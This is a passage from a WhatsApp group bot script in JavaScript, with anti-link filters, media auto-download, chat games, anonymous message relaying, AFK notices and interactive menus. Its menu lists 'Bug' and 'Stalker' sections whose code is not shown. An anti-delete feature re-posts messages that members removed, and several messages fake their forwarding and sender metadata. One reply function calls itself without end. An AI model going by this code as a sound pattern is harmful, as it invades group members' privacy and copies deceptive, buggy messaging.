 .catch(error => {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan saat mencoba berkomunikasi dengan SimSimi.');
 });//wm senn
 } 
        if (db.data.groups[m.chat].antilinkgc) {
            if (budy.match('https://chat.whatsapp.com/') && budy.match('chat.whatsapp.com')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmin) return replygcyuta(bvl)
if (m.key.fromMe) return replygcyuta(bvl)
if (YutaTheCreator) return replygcyuta(bvl)
               await Yuta.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Yuta.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        
        if (db.data.groups[m.chat].antilinknumber) {
            if (budy.match('https://wa.me') && budy.match('wa.me') && budy.match('https://w.me') && budy.match('w.me')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmin) return replygcyuta(bvl)
if (m.key.fromMe) return replygcyuta(bvl)
if (YutaTheCreator) return replygcyuta(bvl)
               await Yuta.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Yuta.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        
        if (db.data.groups[m.chat].antilinkch) {
            if (budy.match('https://whatsapp.com') && budy.match('whatsapp.com')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmin) return replygcyuta(bvl)
if (m.key.fromMe) return replygcyuta(bvl)
if (YutaTheCreator) return replygcyuta(bvl)
               await Yuta.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Yuta.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        
        //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe) {
try {
if (budy.match(`instagram.com`)) {
await Yuta.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
Yuta.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
await Yuta.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await Yuta.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
Yuta.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
await Yuta.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await Yuta.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
Yuta.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
await Yuta.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await Yuta.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
Yuta.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await Yuta.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await Yuta.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
		
		// Group Settings
		if (m.isGroup) {
			// Mute
			if (db.data.groups[m.chat].mute && !YutaTheCreator) {
				return
			}
			
			// Anti Delete
			if (m.type == 'protocolMessage' && db.data.groups[m.chat].antidelete) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }
					await Yuta.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
				}
			}
		}
		
		//user db //friend
        if (isCmd && !isUser) {
yutaverifieduser.push(sender)
fs.writeFileSync('./src/user.json', JSON.stringify(yutaverifieduser, null, 2))
}
		
		// Check Expiry
		prem.expiredCheck(Yuta, premium);
		
		// TicTacToe
		let room = Object.values(game.tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
			let ok
			let isWin = !1
			let isTie = !1
			let isSurrender = !1
			if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
			isSurrender = !/^[1-9]$/.test(m.text)
			if (m.sender !== room.game.currentTurn) {
				if (!isSurrender) return !0
			}
			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
				replygcyuta({
					'-3': 'The game is over',
					'-2': 'Invalid',
					'-1': 'Invalid Position',
					0: 'Invalid Position',
				}[ok])
				return !0
			}
			if (m.sender === room.game.winner) isWin = true
			else if (room.game.board === 511) isTie = true
			let arr = room.game.render().map(v => {
				return {
					X: '❌',
					O: '⭕',
					1: '1️⃣',
					2: '2️⃣',
					3: '3️⃣',
					4: '4️⃣',
					5: '5️⃣',
					6: '6️⃣',
					7: '7️⃣',
					8: '8️⃣',
					9: '9️⃣',
				}[v]
			})
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX
				isWin = true
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner
			if (isWin) {
				global.db.data.users[m.sender].limit += 3
				global.db.data.users[m.sender].uang += 3000
			}
			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
			room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
			if (room.x !== room.o) await Yuta.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m })
			await Yuta.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
			if (isTie || isWin) {
				delete game.tictactoe[room.id]
			}
		}
		
		// Suit PvP
		let roof = Object.values(game.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
			let win = ''
			let tie = false
			if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
					replygcyuta(`@${roof.p2.split`@`[0]} rejected the suit,\nsuit cancelled`)
					delete game.suit[roof.id]
					return !0
				}
				roof.status = 'play';
				roof.asal = m.chat;
				clearTimeout(roof.waktu);
				replygcyuta(`The suit has been sent to chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nPlease select a suit in the respective chat https://wa.me/${botNumber.split`@`[0]}`)
				if (!roof.pilih) Yuta.sendMessage(roof.p, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				if (!roof.pilih2) Yuta.sendMessage(roof.p2, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2) replygcyuta(`Both players have no intention of playing,\nSuit cancelled`)
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p
						replygcyuta(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose a suit, the game ends`)
					}
					delete game.suit[roof.id]
					return !0
				}, roof.timeout)
			}
			let jwb = m.sender == roof.p
			let jwb2 = m.sender == roof.p2
			let g = /scissors/i
			let b = /rock/i
			let k = /paper/i
			let reg = /^(scissors|rock|paper)/i;
			
			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0];
				roof.text = m.text;
				replygcyuta(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`);
				if (!roof.pilih2) Yuta.sendMessage(roof.p2, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
				roof.text2 = m.text
				replygcyuta(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
				if (!roof.pilih) Yuta.sendMessage(roof.p, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			let stage = roof.pilih
			let stage2 = roof.pilih2
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih)
				if (b.test(stage) && g.test(stage2)) win = roof.p
				else if (b.test(stage) && k.test(stage2)) win = roof.p2
				else if (g.test(stage) && k.test(stage2)) win = roof.p
				else if (g.test(stage) && b.test(stage2)) win = roof.p2
				else if (k.test(stage) && b.test(stage2)) win = roof.p
				else if (k.test(stage) && g.test(stage2)) win = roof.p2
				else if (stage == stage2) tie = true
				global.db.data.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3
				global.db.data.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000
				Yuta.sendMessage(roof.asal, { text: `_*Suit Results*_${tie ? '\nSERIES' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}\n\nWinner Gets\n*Present :* Money(3000) & Limit(3)`.trim(), mentions: [roof.p, roof.p2] }, { quoted: m })
				delete game.suit[roof.id]
			}
		}
		
		// Guess Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in game.tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				game.tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				game.tebakbom[m.sender].pick++;
				Yuta.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
				game.tebakbom[m.sender].bomb--;
				game.tebakbom[m.sender].nyawa.pop();
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].nyawa.length < 1) {
					global.db.data.users[m.sender].limit -= 1
					await replygcyuta(`*THE GAME IS OVER*\nYou were hit by a bomb\n\n ${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n_Limit Reduction : 1_`);
					Yuta.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
					delete game.tebakbom[m.sender];
				} else await replygcyuta(`*SELECT A NUMBER*\n\nYou were hit by a bomb\n ${brd.join('')}\n\nSelected: ${game.tebakbom[m.sender].pick}\nRemaining life: ${game.tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				game.tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				game.tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				game.tebakbom[m.sender].pick++;
				game.tebakbom[m.sender].lolos--;
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].lolos < 1) {
					global.db.data.users[m.sender].limit += 3
					global.db.data.users[m.sender].uang += 3000
					await replygcyuta(`*YOU ARE GREAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n*Remaining life :* ${game.tebakbom[m.sender].nyawa}\n*Bomb :* ${game.tebakbom[m.sender].bomb}\n*Present :* Money(3000) & Limit(3)`);
					delete game.tebakbom[m.sender];
				} else replygcyuta(`*SELECT A NUMBER*\n\n${brd.join('')}\n\nSelected : ${game.tebakbom[m.sender].pick}\nRemaining life : ${game.tebakbom[m.sender].nyawa}\nBomb : ${game.tebakbom[m.sender].bomb}`)
			}
		}
		
		// Math
		if (game.kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = game.kuismath[m.sender.split('@')[0]].jawaban
			const difficultyMap = { 'noob': 1, 'easy': 2, 'medium': 3, 'hard': 4, 'extreme': 5, 'impossible': 6, 'impossible2': 7 };
			let hasilLimit = difficultyMap[game.kuismath[m.sender.split('@')[0]].mode]
			if (isNaN(budy)) return
			if (budy.toLowerCase() == jawaban) {
				global.db.data.users[m.sender].limit += hasilLimit
				global.db.data.users[m.sender].uang += hasilLimit * 1000
				await replygcyuta(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\nYou Get a Limit *${hasilLimit}*\n\nWant to play again? Send ${prefix}math mode`)
				delete game.kuismath[m.sender.split('@')[0]]
			} else replygcyuta('*Wrong answer!*')
		}
		
		// Menfes
		if (!m.isGroup) {
			if (game.menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}
					const pesan = m.type === 'conversation' ? { extendedTextMessage: { text: m.msg, contextInfo: { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}}} : { [m.type]: m.msg }
					await Yuta.relayMessage(game.menfes[m.sender].tujuan, pesan, {});
				}
			}
		}
		
		// Afk
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
let jgntag =`Jangan Tag Dia!\nDia Lagi Afk ${reason ? 'with reason ' + reason : 'no reason'}\nJam ${clockString(new Date - afkTime)}`.trim()
let leo = {
  text: jgntag,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: botname,
      mediaType: 1,
      body: ownername,
      //previewType: "PHOTO",
      thumbnailUrl: "https://files.catbox.moe/8plg1x.jpg",
      renderLargerThumbnail: true,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Afk By : ${botname}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
}

if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
let kembali = `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' after ' + user.afkReason : ''}\nDuring ${clockString(new Date - user.afkTime)}`
let leo = {
  text: kembali,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: botname,
      mediaType: 1,
      body: ownername,
      //previewType: "PHOTO",
      thumbnailUrl: "https://files.catbox.moe/lt4rr1.jpg",
      renderLargerThumbnail: true,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Afk By : ${botname}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
user.afkTime = -1
user.afkReason = ''
}
async function buttonreply(teks, ftr = "", title = "", qtd = null, ctx = null) {
    let msg = generateWAMessageFromContent(from, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: teks
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: ftr
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              title: title
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{name:''}]
            }),
            contextInfo: ctx
          })
        }
      }
    }, {
      'userJid': from,
      'quoted': qtd
    })
    Yuta.relayMessage(from, msg.message, {
      messageId: msg.key.id,
    })
}

//reply
async function replygcyuta(teks) {
 if (typereply === 'v1') {
 replygcyuta(teks)
 } else if (typereply === 'v2') {
 Yuta.sendMessage(m.chat, {
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: ownername,
 previewType: "PHOTO",
 thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
 sourceUrl: wagc
 }
 },
 text: teks
 }, {quoted: m});
} else if (typereply === 'v3') {
 Yuta.sendMessage(m.chat, {
 text: teks,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: ownername,
 jpegThumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
 sourceUrl: linkch,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
}, { quoted: m })
} else if (typereply === 'v4') {
replygcyuta2(teks)
} else if (typereply === 'v5') {
buttonreply(teks, botname, "", fnews)
} else if (typereply === 'v6') {
const yutareply = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Finsii-Bot [ Update Bot Wa ]",
newsletterJid: saluran,
},
},
text: teks,
}
return Yuta.sendMessage(m.chat, yutareply, { quoted: fnews, })
 }
}


//typemenu
async function menuv(textt) {
 if (typemenu === 'v1') {
let sections = [{
title: '<!>Informasi Bot',
highlight_label: 'Script Bot Wa',
rows: [{
title: '<!>Script',
description: `Displays Script`, 
id: `${prefix}sc`
},
{

title: '<!>ping',
description: `Displays Ping`, 
id: `${prefix}ping`
},
{
title: '<!>Rules',
description: `Displays Rules`, 
id: `${prefix}rules`
},
{
title: '<!>Owner',
description: `Displays Owner`, 
id: `${prefix}owner`
},
]
},
{
title: '<!>Menu List',
highlight_label: 'All Menu',
rows: [{
title: '<!>Menu All',
description: `Displays All Menu`, 
id: `${prefix}allmenu`
},
{
title: '<!>Menu list',
description: `Displays List Menu`, 
id: `${prefix}listmenu`
},
{
title: '<!>List Server Minecraft',
description: `Displays Server Minecraft Menu`, 
id: `${prefix}servermcmenu`
},
{
title: '<!>Menu Quotes',
description: `Displays Quotes Menu`, 
id: `${prefix}quotesmenu`
},
{
title: '<!>Menu Islami',
description: `Displays Islami Menu`, 
id: `${prefix}islamimenu`
},
{
title: '<!>Menu Search',
description: `Displays Server Search Menu`, 
id: `${prefix}searchmenu`
},
{
title: '<!>Menu Download',
description: `Displays the Download Menu`,
id: `${prefix}downloadmenu`
},
{
title: '<!>Menu Game',
description: `Displays the Game Menu`,
id: `${prefix}gamemenu`
},
{
title: '<!>Menu Fun',
description: `Displays the Fum Menu`,
id: `${prefix}funmenu`
},
{
title: '<!>Menu Owner',
description: `Displays the Owner Menu`,
id: `${prefix}ownermenu`
},
{
title: '<!>Menu Ai',
description: `Displays the Ai Menu`,
id: `${prefix}aimenu`
},
{
title: '<!>Menu Gruop',
description: `Displays the Gruop Menu`,
id: `${prefix}groupmenu`
},
{
title: '<!>Menu List Lain',
description: `Displays the List Lain Menu`,
id: `${prefix}listmenulain`
},
{
title: '<!>Menu Religion',
description: `Displays the Religion Menu`,
id: `${prefix}religionmenu`
},
{
title: '<!>Menu Anime',
description: `Displays the Anime Menu`,
id: `${prefix}animemenu`
},
{
title: '<!>Menu Random Photo',
description: `Displays the Random Photo Menu`,
id: `${prefix}randomphotomenu`
},
{
title: '<!>Menu Random Video',
description: `Displays the Random Video Menu`,
id: `${prefix}randomvideomenu`
},
{
title: '<!>Menu Sticker',
description: `Displays the Sticker Menu`,
id: `${prefix}stickermenu`
},
{
title: '<!>Menu Store',
description: `Displays the Store Menu`,
id: `${prefix}storemenu`
},
{
title: '<!>Menu Stalker',
description: `Displays the Stalker Menu`,
id: `${prefix}stalkermenu`
},
{
title: '<!>Menu Bug',
description: `Displays the Bug Menu`,
id: `${prefix}bugmenu`
},
]
}]

let listMessage = {
    title: 'List Menu⎙', 
    sections
};

try {
profile = await Yuta.profilePictureUrl(m.sender, 'image');
} catch (e) {
profile = 'https://files.catbox.moe/2li37j.jpg';
}
let leopp = await getBuffer(profile)
let get = await resize(leopp, 100, 100)
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: textt
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `\`[ ! ]\` Hallo ${pushname} Kalau Mau Liat Menu Click List Menu⎙

${botname}  [2024]`
}),
header: proto.Message.InteractiveMessage.Header.create({
//...(await prepareWAMessageMedia({ image : fs.readFileSync('./LeoMedia/theme/cheemspic.jpg')}, { upload: leo.waUploadToServer})), 
...(await prepareWAMessageMedia({ document: fs.readFileSync('./YutaMedia/doc.txt'), fileName: `Halo Bg ${pushname} `, mimetype: 'image/null', fileLength: 0, pageCount: '', jpegThumbnail: get, }, { upload: Yuta.waUploadToServer})), 
title: ``,
gifPlayback: true,
subtitle: ownername,
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"Grup","url":"${linkgc}","merchant_url":"${linkgc}"}`
 },
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"Saluran","url":"${linkch}","merchant_url":"${linkch}"}`
}
],
}),
 contextInfo: {
 mentionedJid: [m.sender], 
 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: { 
 title: botname, 
 body: ``,
 thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
 sourceUrl: linkch,
 mediaType: 1,
 renderLargerThumbnail: true
},
 forwardedNewsletterMessageInfo: {
 newsletterJid: saluran,
 newsletterName: `By : ${ownername}`,
 serverMessageId: 143
}
}
})
}
}
}, { quoted: fnews })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id })
} else if (typemenu === 'v2') {
let sections = [{
title: '<!>Informasi Bot',
highlight_label: 'Script Bot Wa',
rows: [{
title: '<!>Script',
description: `Displays Script`, 
id: `${prefix}sc`
},
{

title: '<!>ping',
description: `Displays Ping`, 
id: `${prefix}ping`
},
{
title: '<!>Rules',
description: `Displays Rules`, 
id: `${prefix}rules`
},
{
title: '<!>Owner',
description: `Displays Owner`, 
id: `${prefix}owner`
},
]
},
{
title: '<!>Menu List',
highlight_label: 'All Menu',
rows: [{
title: '<!>Menu All',
description: `Displays All Menu`, 
id: `${prefix}allmenu`
},
{
title: '<!>Menu list',
description: `Displays List Menu`, 
id: `${prefix}listmenu`
},
{
title: '<!>List Server Minecraft',
description: `Displays Server Minecraft Menu`, 
id: `${prefix}servermcmenu`
},
{
title: '<!>Menu Quotes',
description: `Displays Quotes Menu`, 
id: `${prefix}quotesmenu`
},
{
title: '<!>Menu Islami',
description: `Displays Islami Menu`, 
id: `${prefix}islamimenu`
},
{
title: '<!>Menu Search',
description: `Displays Server Search Menu`, 
id: `${prefix}searchmenu`
},
{
title: '<!>Menu Download',
description: `Displays the Download Menu`,
id: `${prefix}downloadmenu`
},
{
title: '<!>Menu Game',
description: `Displays the Game Menu`,
id: `${prefix}gamemenu`
},
{
title: '<!>Menu Fun',
description: `Displays the Fum Menu`,
id: `${prefix}funmenu`
},
{
title: '<!>Menu Owner',
description: `Displays the Owner Menu`,
id: `${prefix}ownermenu`
},
{
title: '<!>Menu Ai',
description: `Displays the Ai Menu`,
id: `${prefix}aimenu`
},
{
title: '<!>Menu Gruop',
description: `Displays the Gruop Menu`,
id: `${prefix}groupmenu`
},
{
title: '<!>Menu List Lain',
description: `Displays the List Lain Menu`,
id: `${prefix}listmenulain`
},
{
title: '<!>Menu Religion',
description: `Displays the Religion Menu`,
id: `${prefix}religionmenu`
},
{
title: '<!>Menu Anime',
description: `Displays the Anime Menu`,
id: `${prefix}animemenu`
},
{
title: '<!>Menu Random Photo',
description: `Displays the Random Photo Menu`,
id: `${prefix}randomphotomenu`
},
{
title: '<!>Menu Random Video',
description: `Displays the Random Video Menu`,
id: `${prefix}randomvideomenu`
},
{
title: '<!>Menu Sticker',
description: `Displays the Sticker Menu`,
id: `${prefix}stickermenu`
},
{
title: '<!>Menu Store',
description: `Displays the Store Menu`,
id: `${prefix}storemenu`
},
{
title: '<!>Menu Stalker',
description: `Displays the Stalker Menu`,
id: `${prefix}stalkermenu`
},
{
title: '<!>Menu Bug',
description: `Displays the Bug Menu`,
id: `${prefix}bugmenu`
},
]
}]

let listMessage = {
    title: 'List Menu⎙', 
    sections
};

try {
profile = await Yuta.profilePictureUrl(m.sender, 'image');
} catch (e) {
profile = 'https://files.catbox.moe/2li37j.jpg';
}
let leopp = await getBuffer(profile)
let get = await resize(leopp, 100, 100)
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: textt
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `\`[ ! ]\` Hallo ${pushname} Kalau Mau Liat Menu Click List Menu⎙

Deku Midoriya Izuku [2024]`
}),
header: proto.Message.InteractiveMessage.Header.create({
//...(await prepareWAMessageMedia({ image : fs.readFileSync('./LeoMedia/theme/cheemspic.jpg')}, { upload: leo.waUploadToServer})), 
...(await prepareWAMessageMedia({ document: fs.readFileSync('./YutaMedia/doc.txt'), fileName: `Halo Bg ${pushname} `, mimetype: 'image/null', fileLength: 0, pageCount: '', jpegThumbnail: get, }, { upload: Yuta.waUploadToServer})), 
title: ``,
gifPlayback: true,
subtitle: ownername,
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"Grup","url":"${linkgc}","merchant_url":"${linkgc}"}`
 },
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"Saluran","url":"${linkch}","merchant_url":"${linkch}"}`
}
],
}),
 contextInfo: {
 mentionedJid: [m.sender], 
 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: { 
 title: 'Deku-Botz', 
 body: ``,
 thumbnailUrl: 'https://files.catbox.moe/7pe0vh.jpg',
 sourceUrl: linkch,
 mediaType: 1,
 renderLargerThumbnail: true
},
 forwardedNewsletterMessageInfo: {
 newsletterJid: saluran,
 newsletterName: `By : ${ownername}`,
 serverMessageId: 143
}
}
})
}
}
}, { quoted: fnews })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id })
}}

//premium
        async function replyprem(teks) {
    replygcyuta(`This feature is for premium user, contact the owner to become premium user`)
}

//script replier
        async function sendYutaMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Yuta.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//theme sticker reply
        const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./YutaMedia/theme/sticker_reply/wait.webp')
        Yuta.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./YutaMedia/theme/sticker_reply/admin.webp')
        Yuta.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./YutaMedia/theme/sticker_reply/botadmin.webp')
        Yuta.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./YutaMedia/theme/sticker_reply/owner.webp')
        Yuta.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./YutaMedia/theme/sticker_reply/group.webp')
        Yuta.sendMessage(m.chat, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickPrivate = () => {
